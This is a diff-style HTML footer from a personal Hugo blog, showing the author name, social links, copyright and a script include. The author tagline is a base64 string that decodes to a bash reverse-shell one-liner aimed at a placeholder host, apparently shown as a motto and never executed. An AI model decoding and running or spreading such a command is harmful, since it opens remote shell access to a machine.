+    <main aria-role="main">
+        <div class="footer_author">
+            
+            
+    
+            <h2><a href="https://mostxeon.github.io/">Most Xeon</a></h2>
+    
+            
+    <h6>YmFzaCAtaSA&#43;JiAvZGV2L3RjcC9EUkVBTS8xMzM3IDA&#43;JjE=</h6>
+                <div class="social-icons-class">
+                    &nbsp; <a href="https://twitter.com/" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a> &nbsp;&nbsp; <a href="mailto:mostxeon@gmail.com" target="_blank" rel="noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a> &nbsp;&nbsp; <a href="https://github.com/MostXeon" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a> &nbsp;
+                </div>
+        </div>
+    </main>
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            
+            <span><a href="https://mostxeon.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Tweaked from the one by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.923d14538da8896ffabde570adf70a56ac677c982dd4be31b4b4b65a67c17bfdb6f99d38228bea3c25e1205fd69abf149502492621047fe3a2c819646d50cb0b.js" integrity="sha512-kj0UU42oiW/6veVwrfcKVqxnfJgt1L4xtLS2WmfBe/22&#43;Z04IovqPCXhIF/Wmr8UlQJJJiEEf&#43;OiyBlkbVDLCw=="></script>
+
+
+
+    </body>
+</html>
